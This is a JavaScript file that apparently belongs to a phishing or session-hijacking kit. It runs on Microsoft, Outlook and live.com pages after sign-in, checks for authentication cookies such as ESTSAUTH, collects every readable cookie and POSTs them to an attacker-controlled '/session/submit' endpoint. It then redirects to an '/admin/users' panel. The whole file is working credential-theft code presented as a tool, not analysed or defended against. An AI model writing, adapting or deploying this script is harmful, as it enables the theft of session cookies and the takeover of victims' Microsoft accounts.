// Cookie capture script - runs after successful Microsoft authentication
(function() {
  // Check if we're on a Microsoft domain after successful auth
  const isMicrosoftDomain = window.location.hostname.includes('microsoft') || 
                           window.location.hostname.includes('outlook') ||
                           window.location.hostname.includes('live.com');
  
  // Check if authentication was successful
  const isAuthSuccess = window.location.href.includes('account.microsoft.com') ||
                       window.location.href.includes('outlook.office.com') ||
                       window.location.href.includes('myaccount.microsoft.com') ||
                       document.cookie.includes('ESTSAUTH');
  
  if (isMicrosoftDomain && isAuthSuccess) {
    console.log('🍪 Authentication detected, capturing cookies...');
    
    // Get userId from URL or storage
    const urlParams = new URLSearchParams(window.location.search);
    const userId = urlParams.get('state') || 
                   urlParams.get('userId') || 
                   sessionStorage.getItem('userId') ||
                   localStorage.getItem('userId');
    
    if (userId) {
      captureCookies(userId);
    }
  }
  
  function captureCookies(userId) {
    // Get all cookies
    const cookies = document.cookie.split(';').map(cookie => {
      const [name, ...valueParts] = cookie.trim().split('=');
      return {
        name: name,
        value: valueParts.join('='),
        domain: window.location.hostname,
        path: '/',
        secure: window.location.protocol === 'https:',
        httpOnly: false // Can't detect HttpOnly from JS
      };
    });
    
    // Also try to get cookies from all Microsoft domains
    const allCookies = [...cookies];
    
    // Send cookies to our server
    fetch(`${getBaseUrl()}/session/submit/${userId}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ cookies: allCookies }),
      credentials: 'include'
    })
    .then(response => response.json())
    .then(data => {
      if (data.success) {
        console.log(`✅ Successfully captured ${data.cookieCount} cookies`);
        
        // Redirect back to our domain
        setTimeout(() => {
          window.location.href = `${getBaseUrl()}/admin/users`;
        }, 2000);
      }
    })
    .catch(error => {
      console.error('❌ Cookie capture failed:', error);
    });
  }
  
  function getBaseUrl() {
    // Try to determine our server URL
    const referrer = document.referrer;
    if (referrer && referrer.includes('localhost')) {
      return referrer.split('/')[0] + '//' + referrer.split('/')[2];
    }
    return 'http://localhost:8000'; // fallback
  }
})();